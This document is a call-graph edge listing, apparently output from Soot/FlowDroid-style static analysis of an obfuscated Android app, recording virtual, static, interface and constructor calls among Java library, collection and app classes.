VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $r2 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <llg: java.lang.Object next()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lrg: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <ljf: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(char[],char[])>($r12, $r13) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(char[],char[])>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "message") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: int o(int,int,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r7 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>("com.google.common.base.Strings") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<hnq: void <init>()>() in <hnt: void <clinit>()> ==> <hnq: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb C(int)>(0) in <lkq: lsb B()> ==> <lkq: lsb C(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <mly: java.lang.IllegalArgumentException f()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lvs: void <init>(java.lang.String,int)>("BOOLEAN", 0) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <izw: java.lang.Object[] S(java.lang.Iterable)>($r1) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <izw: java.lang.Object[] S(java.lang.Iterable)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(byte[],byte)>($r4, -1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(byte[],byte)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(int[],int)>($r8, $i1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(int[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
STATIC edge: staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lly: void j(java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lma: void <init>()> ==> <lkh: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null value in entry: ") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lql: java.lang.Object get(int)> ==> <iye: void O(int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r1, $r10) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lmo: void <init>(java.util.Comparator)>($r2) in <lqs: void <init>(lkq,java.util.Comparator)> ==> <lmo: void <init>(java.util.Comparator)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r11 = staticinvoke <hny: hny a(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hny: hny a(hmm)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: int[] r()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
CLINIT edge: staticinvoke <hef: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hef: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lsb: boolean hasNext()>
STATIC edge: $r3 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(15) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i1) in <ljd: int b()> ==> <ljd: void A(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorGifSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>($i0, 2) in <izw: int ae(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
STATIC edge: $r2 = staticinvoke <lum: lul g()>() in <lsn: boolean ac()> ==> <lum: lul g()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(">") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: int size()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lqr: int size()>
VIRTUAL edge: virtualinvoke r0.<ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>($i0, $r2, $r1, $i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lqd: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.String toHexString(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.lang.Comparable: int compareTo(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lts: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: int b()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int b()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r3) in <ljb: java.lang.Object getValue()> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw f(java.lang.String)> ==> <ivw: ivv I()>
SPECIAL edge: specialinvoke $r24.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_SUGGESTION_METADATA", 24, 24) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
VIRTUAL edge: $r9 = virtualinvoke $r8.<llo: lma u()>() in <hbv: void j()> ==> <llo: lma u()>
STATIC edge: $i5 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ag(int,int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqm: java.lang.Object get(int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be greater than size (%s)", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void q(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void q(int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lkq: int hashCode()>
STATIC edge: staticinvoke <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>($r3, $r3, $i5, $i0, $i4) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>
VIRTUAL edge: $r6 = virtualinvoke $r4.<lts: lsz c(int)>($i1) in <lsn: boolean ac()> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_IMAGE", 14, 14) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int min(int,int)>($i2, $i1) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int min(int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r11.<lma: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: int size()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: int size()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int a()>() in <lvq: int size()> ==> <lvq: int a()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(byte[],byte[])>($r4, $r5) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(byte[],byte[])>
SPECIAL edge: specialinvoke $r26.<mag: void <init>(java.lang.String,int,int)>("TENOR_AUTOCOMPLETE_METADATA", 26, 26) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object h(int)>
SPECIAL edge: specialinvoke $r14.<gcs: void <init>(hbv,lma,int)>(r0, $r9, 12) in <hbv: void j()> ==> <gcs: void <init>(hbv,lma,int)>
CLINIT edge: staticinvoke <java.util.concurrent.TimeUnit: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.concurrent.TimeUnit: void <clinit>()>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljf: int b()> ==> <iye: void I(boolean,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, 0) in <lvr: void <init>(java.util.List)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalStateException: void <init>(java.lang.String)>("Recursive update") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: $i4 = staticinvoke <izw: int af(int,int)>($i3, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(13) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<qc: void <init>()>() in <ivw: void <clinit>()> ==> <qc: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map o()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<java.lang.String: int compareTo(java.lang.String)>($r2) in <java.lang.String: int compareTo(java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.String)>
INTERFACE edge: $r0 = interfaceinvoke $r2.<lwi: java.lang.StackTraceElement[] b(java.lang.Class,int)>($r1, $i0) in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.lang.Object k(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_period", class "Llst;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: $r5 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: $r10 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i1, $r1, $r2, null, null) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r13) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("extension subtags are out of order: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>($r1) in <lri: void t(java.lang.Object,int)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must be less than size (%s)", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lvr: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r6.<lvs: int compareTo(java.lang.Enum)>($r7) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int compareTo(java.lang.Enum)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: java.util.Iterator iterator()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
